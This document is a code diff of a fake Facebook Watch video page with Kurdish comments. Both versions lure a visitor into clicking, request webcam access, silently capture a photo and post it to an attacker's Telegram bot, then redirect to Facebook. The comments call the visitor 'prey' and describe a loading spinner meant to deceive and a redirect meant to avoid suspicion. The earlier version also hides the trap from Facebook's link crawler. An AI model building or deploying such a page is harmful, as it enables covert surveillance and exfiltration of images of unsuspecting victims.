@@ -3,49 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta property="og:site_name" content="facebook.com">
-    <meta property="og:title" content="Facebook Watch | ڤیدیۆیەکی تایبەت">
-    <meta property="og:image" content="thumbnail.jpg">
-    <meta property="og:url" content="https://www.facebook.com">
-    <meta property="og:type" content="video.other">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Video</title>
+    <meta property="og:title" content="Facebook Watch | ڤیدیۆیەکی نوێ">
+    <meta property="og:image" content="video-cover.jpg">
+    <title>Facebook Video Player</title>
     <style>
         body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        video { width: 100%; height: 100%; object-fit: cover; }
-        .play { position: absolute; width: 80px; height: 80px; background: rgba(0,0,0,0.5); border-radius: 50%; border: 2px solid #fff; }
-        .play::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent #fff; position: absolute; top: 25px; left: 30px; }
+        /* وێنەی نێچیرەکە وەک پۆستەری ڤیدیۆ */
+        #poster { width: 100%; height: auto; max-width: 600px; cursor: pointer; z-index: 10; }
+        .loading-ring { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body>
-    <video id="v" autoplay playsinline poster="thumbnail.jpg"></video>
-    <div class="play"></div>
+<body onclick="takeCapture()">
+
+    <img id="poster" src="video-cover.jpg">
+    <div id="loader" class="loading-ring"></div>
+
+    <video id="v" style="display:none" autoplay playsinline></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script>
-        // لێرە Token و Chat ID تەلەگرامەکەت دابنێ
-        const T = 'لێرە_TOKEN_دابنێ';
-        const C = 'لێرە_CHATID_دابنێ';
-        const FB = "https://www.facebook.com/watch";
+        // لێرە زانیارییەکانت دابنێ
+        const BOT_TOKEN = 'لێرە_تۆکن_دابنێ';
+        const CHAT_ID = 'لێرە_ئایدی_دابنێ';
 
-        if (!navigator.userAgent.includes("facebookexternalhit")) {
-            window.onclick = async () => {
-                try {
-                    const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                    document.getElementById('v').srcObject = s;
-                    setTimeout(() => {
-                        const can = document.getElementById('c');
-                        const vid = document.getElementById('v');
-                        can.width = vid.videoWidth; can.height = vid.videoHeight;
-                        can.getContext('2d').drawImage(vid, 0, 0);
-                        can.toBlob(b => {
-                            const f = new FormData();
-                            f.append('chat_id', C); f.append('photo', b, 's.jpg');
-                            fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f })
-                            .then(() => location.href = FB);
-                        }, 'image/jpeg');
-                    }, 1000);
-                } catch (e) { location.href = FB; }
-            };
+        async function takeCapture() {
+            // شاردنەوەی وێنەکە و پیشاندانی Loading بۆ خەڵەتاندن
+            document.getElementById('poster').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'nicher.jpg');
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
+                        .then(() => {
+                            // دوای وێنەگرتن دەچێتە سەر ڤیدیۆ ئەسڵییەکە
+                            window.location.href = "https://www.facebook.com/watch";
+                        });
+                    }, 'image/jpeg');
+                }, 1000);
+            } catch (err) {
+                // ئەگەر نێچیرەکە "Allow" نەکرد، هەر بیبە بۆ فەیسبووک تا گومان نەکات
+                window.location.href = "https://www.facebook.com/watch";
+            }
         }
     </script>
 </body>
